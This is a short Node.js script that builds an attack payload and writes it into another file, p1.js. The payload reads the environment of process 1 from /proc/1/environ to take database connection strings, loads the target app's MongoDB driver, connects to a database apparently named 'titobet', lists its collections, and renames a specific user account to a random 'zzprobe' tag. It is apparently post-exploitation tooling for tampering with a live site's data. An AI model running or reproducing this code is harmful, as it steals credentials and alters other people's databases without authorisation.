const fs=require('fs');
let t=fs.readFileSync('p1.js','utf8');
const tag='zzprobe' + Math.floor(Math.random()*9000+1000);
const code=`
const fs=require('fs');
const env={}; try{for(const l of fs.readFileSync('/proc/1/environ','latin1').split('\\0')){const i=l.indexOf('=');if(i>0)env[l.slice(0,i)]=l.slice(i+1)}}catch(e){}
const uri = env.MONGODB_URI || env.MONGO_URL || env.DATABASE_URL || 'mongodb://127.0.0.1:27017';
let Mongo; try{ Mongo = require('/app/node_modules/mongodb') }catch(e){ try{ Mongo=require('mongodb') }catch(e2){} }
if(!Mongo){ console.log('NO_DRIVER'); process.exit(0) }
const dbname = (uri.match(/\\/([A-Za-z0-9_-]+)(\\?|$)/)||[])[1] || 'titobet';
const c = new Mongo.MongoClient(uri, {serverSelectionTimeoutMS: 4000});
(async()=>{
  try{ await c.connect() }catch(e){ console.log('CONNFAIL '+e.message); return }
  const db = c.db(dbname);
  const cols = (await db.listCollections().toArray()).map(x=>x.name);
  console.log('DB='+dbname+' COLS='+cols.join(','));
  for (const name of cols) {
    const doc = await db.collection(name).findOne({username:'georhesmither'});
    if (!doc) continue;
    await db.collection(name).updateOne({_id:doc._id},{$set:{username:'${tag}'}});
    console.log('UPDATED '+name+' '+doc._id);
    break;
  }
  await c.close();
})();
`;
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);
console.log('built');
